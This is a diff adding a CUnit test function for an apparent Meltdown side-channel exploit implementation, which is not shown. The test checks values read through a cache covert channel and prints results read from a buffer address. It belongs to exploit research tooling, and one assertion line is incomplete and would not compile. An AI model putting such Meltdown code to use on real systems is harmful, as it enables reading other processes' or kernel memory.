@@ -42,6 +42,33 @@ void test_cc_transmission(){
     }
 }
 
+void test_meltdown(){
+    // test valid values
+    wait(1E9);
+    cc_init();
+    uint8_t test_num;
+    for (int i=0;i<256;i++){
+        test_num=i;
+        meltdown((uintptr_t) &test_num);
+        CU_ASSERT_EQUAL(test_num, cc_receive());
+        asm volatile("mfence\n"); 
+        meltdown((uintptr_t) &test_num);
+        CU_ASSERT_EQUAL(test_num, cc_receive());
+        asm volatile("mfence\n"); 
+    }
+    
+    uintptr_t target = (uintptr_t) &cc_buffer[8*283000];
+    CU_ASSERT_EQUAL
+    printf("%i\n", do_meltdown( target));
+    printf("%i\n", do_meltdown( target));
+    printf("%i\n", do_meltdown( target));
+    munmap(cc_buffer, cc_buf_size);
+    
+    // test via a file
+    
+    // test segfault
+}
+
 
 int main() {
     CU_initialize_registry();
